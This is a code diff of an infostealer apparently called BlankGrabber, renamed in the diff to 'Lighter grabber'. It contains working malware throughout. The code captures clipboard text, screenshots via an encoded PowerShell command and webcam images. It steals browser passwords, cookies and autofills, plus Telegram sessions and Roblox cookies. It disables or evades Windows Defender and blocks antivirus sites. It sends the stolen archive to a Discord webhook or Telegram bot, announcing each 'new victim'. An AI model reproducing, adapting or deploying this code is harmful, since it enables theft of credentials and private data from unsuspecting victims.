@@ -1313,7 +1313,7 @@ class BlankGrabber:
         if Settings.CaptureSystemInfo:
             Logger.info("Getting clipboard text")
             saveToDir = os.path.join(self.TempFolder, "System")
-
+ 
             process = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True)
             if process.returncode == 0:
                 content = process.stdout.decode(errors= "ignore").strip()
@@ -1327,7 +1327,7 @@ class BlankGrabber:
         if Settings.CaptureSystemInfo:
             Logger.info("Getting antivirus")
             saveToDir = os.path.join(self.TempFolder, "System")
-
+ 
             process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell= True, capture_output= True)
             if process.returncode == 0:
                 output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n").splitlines()
@@ -1342,7 +1342,7 @@ class BlankGrabber:
         if Settings.CaptureSystemInfo:
             Logger.info("Getting task list")
             saveToDir = os.path.join(self.TempFolder, "System")
-
+ 
             process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
             output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
             if output:
@@ -1372,7 +1372,7 @@ class BlankGrabber:
             command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
             if subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= self.TempFolder).returncode == 0:
                 self.ScreenshotTaken = True
-
+ 
     @Errors.Catch
     def BlockSites(self) -> None: # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
         if Settings.BlockAvSites:
@@ -1386,7 +1386,7 @@ class BlankGrabber:
             return
         
         Logger.info("Stealing browser data")
-
+ 
         threads: list[Thread] = []
         paths = {
             "Brave" : (os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"), "brave"),
@@ -1403,7 +1403,7 @@ class BlankGrabber:
             "Vivaldi" : (os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"), "vivaldi"),
             "Yandex" : (os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data"), "yandex")
         }
-
+ 
         for name, item in paths.items():
             path, procname = item
             if os.path.isdir(path):
@@ -1412,15 +1412,15 @@ class BlankGrabber:
                         Utility.TaskKill(procname)
                         browser = Browsers.Chromium(path)
                         saveToDir = os.path.join(self.TempFolder, "Credentials", name)
-
+ 
                         passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                         cookies = browser.GetCookies() if Settings.CaptureCookies else None
                         history = browser.GetHistory() if Settings.CaptureHistory else None
                         autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
-
+ 
                         if passwords or cookies or history or autofills:
                             os.makedirs(saveToDir, exist_ok= True)
-
+ 
                             if passwords:
                                 output = ["URL: {}\nUsername: {}\nPassword: {}".format(*x) for x in passwords]
                                 with open(os.path.join(saveToDir, "{} Passwords.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
@@ -1444,11 +1444,11 @@ class BlankGrabber:
                                 with open(os.path.join(saveToDir, "{} Autofills.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                     file.write(output)
                                 self.AutofillCount += len(autofills)
-
-
+ 
+ 
                     except Exception:
                         pass
-
+ 
                 t = Thread(target= run, args= (name, path))
                 t.start()
                 threads.append(t)
@@ -1458,13 +1458,13 @@ class BlankGrabber:
         
         if Settings.CaptureGames:
             self.StealRobloxCookies()
-
+ 
     @Errors.Catch
     def Webshot(self) -> None: # Captures snapshot(s) from the webcam(s)
         if Settings.CaptureWebcam:
             camdir = os.path.join(self.TempFolder, "Webcam")
             os.makedirs(camdir, exist_ok= True)
-
+ 
             camIndex = 0
             while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, "Webcam (%d).bmp" % (camIndex + 1))):
                 camIndex += 1
@@ -1477,22 +1477,22 @@ class BlankGrabber:
     def StealTelegramSessions(self) -> None: # Steals telegram session(s) files
         if Settings.CaptureTelegram:
             Logger.info("Stealing telegram sessions")
-
+ 
             telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Telegram")] if x is not None])]
             multiple = len(telegramPaths) > 1
             saveToDir = os.path.join(self.TempFolder, "Messenger", "Telegram")
             
             if not telegramPaths:
                 telegramPaths.append(os.path.join(os.getenv("appdata"), "Telegram Desktop"))
-
-
+ 
+ 
             for index, telegramPath in enumerate(telegramPaths):
                 tDataPath = os.path.join(telegramPath, "tdata")
                 loginPaths = []
                 files = []
                 dirs = []
                 has_key_datas = False
-
+ 
                 if os.path.isdir(tDataPath):
                     for item in os.listdir(tDataPath):
                         itempath = os.path.join(tDataPath, item)
@@ -1515,7 +1515,7 @@ class BlankGrabber:
                     if multiple:
                         _saveToDir = os.path.join(_saveToDir, "Profile %d" % (index + 1))
                     os.makedirs(_saveToDir, exist_ok= True)
-
+ 
                     failed = False
                     for loginPath in loginPaths:
                         try:
@@ -1586,11 +1586,11 @@ class BlankGrabber:
             Logger.info("Uploading %s to gofile" % (filename or "file"))
             with open(path, "rb") as file:
                 fileBytes = file.read()
-
+ 
             if filename is None:
                 filename = os.path.basename(path)
             http = PoolManager(cert_reqs="CERT_NONE")
-
+ 
             try:
                 server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode(errors= "ignore"))["data"]["server"]
                 if server:
@@ -1613,27 +1613,27 @@ class BlankGrabber:
             raise FileNotFoundError("Failed to create archive")
         
         filename = "Blank-%s.%s" % (os.getlogin(), extention)
-
+ 
         computerName = os.getenv("computername") or "Unable to get computer name"
             
         computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()
         computerOS = computerOS[2].strip() if len(computerOS) >= 2 else "Unable to detect OS"
-
+ 
         totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
         totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"
-
+ 
         uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
         uuid = uuid[1].strip() if len(uuid) >= 1 else "Unable to detect UUID"
-
+ 
         cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to detect CPU"
-
+ 
         gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()
         gpu = gpu[2].strip() if len(gpu) >= 2 else "Unable to detect GPU"
-
+ 
         productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to get product key"
-
+ 
         http = PoolManager(cert_reqs="CERT_NONE")
-
+ 
         try:
             r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode(errors= "ignore"))
             if r.get("status") != "success":
@@ -1645,9 +1645,9 @@ class BlankGrabber:
             ipinfo = "(Unable to get IP info)"
         else:
             ipinfo = data
-
+ 
         system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"
-
+ 
         collection = {
             "Discord Accounts" : self.DiscordTokensCount,
             "Passwords" : self.PasswordsCount,
@@ -1670,31 +1670,31 @@ class BlankGrabber:
         }
         
         grabbedInfo = "\n".join([key + " : " + str(value) for key, value in collection.items()])
-
+ 
         match Settings.C2[0]:
             case 0: # Discord Webhook
-                image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
-
+                image_url = "https://raw.githubusercontent.com/Blank-c/Lighter-grabber/main/.github/workflows/image.png"
+ 
                 payload = {
                     "content": "||@everyone||" if Settings.PingMe else "",
                     "embeds": [
                         {
-                            "title": "Blank Grabber",
+                            "title": "Lighter grabber",
                             "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-                            "url": "https://github.com/Blank-c/Blank-Grabber",
+                            "url": "https://github.com/Blank-c/Lighter-grabber",
                             "color": 34303,
                             "footer": {
-                                "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+                                "text": "Grabbed by Lighter grabber | https://github.com/Blank-c/Lighter-grabber"
                             },
                             "thumbnail": {
                                 "url": image_url
                             }
                         }
                     ],
-                    "username" : "Blank Grabber",
+                    "username" : "Lighter grabber",
                     "avatar_url" : image_url
                 }
-
+ 
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20: # 20 MB
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
@@ -1703,22 +1703,22 @@ class BlankGrabber:
                     url = None
                 
                 fields = dict()
-
+ 
                 if url:
                     payload["content"] += " | Archive : %s" % url
                 else:
                     fields["file"] = (filename, open(self.ArchivePath, "rb").read())
                 
                 fields["payload_json"] = json.dumps(payload).encode()
-
+ 
                 http.request("POST", Settings.C2[1], fields=fields)
             
             case 1: # Telegram Bot
                 payload = {
-                    'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
+                    'caption': f'<b>Lighter grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                     'parse_mode': 'HTML'
                 }
-
+ 
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40: # 40 MB
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
@@ -1727,7 +1727,7 @@ class BlankGrabber:
                     url = None
                 
                 fields = dict()
-
+ 
                 if url:
                     payload["text"] = payload["caption"] + "\n\nArchive : %s" % url
                     method = "sendMessage"
@@ -1739,7 +1739,7 @@ class BlankGrabber:
                 fields.update(payload)
                 fields.update({'chat_id': chat_id})
                 http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
-
+ 
 if __name__ == "__main__" and os.name == "nt":
     Logger.info("Process started")
     if Settings.HideConsole:
@@ -1772,17 +1772,17 @@ if __name__ == "__main__" and os.name == "nt":
     if Utility.GetSelf()[1]: 
         Logger.info("Trying to exclude the file from Windows defender")
         Utility.ExcludeFromDefender() # Tries to exclude from Defender (only for exe mode)
-
+ 
     Logger.info("Trying to disable defender")
     Utility.DisableDefender() # Tries to disable Defender
-
+ 
     if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.blank")):
         try:
             Logger.info("Trying to extract bound file")
             if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")): # Checks if any bound file exists (only for exe mode)
                 Logger.info("Old bound file found, removing it")
                 os.remove(boundFileDst) # Removes any older bound file
-
+ 
             with open(boundFileSrc, "rb") as file:
                 content = file.read()
             decrypted = zlib.decompress(content[::-1]) # Decompress the file
@@ -1832,7 +1832,7 @@ if __name__ == "__main__" and os.name == "nt":
                 Logger.info("Checking internet connection")
                 if Utility.IsConnectedToInternet(): # Check if internet connection is available
                     Logger.info("Internet connection available, starting stealer (things will be running in parallel)")
-                    BlankGrabber() # Start the grabber
+                    Lightergrabber() # Start the grabber
                     Logger.info("Stealer finished its work")
                     break
                 else:
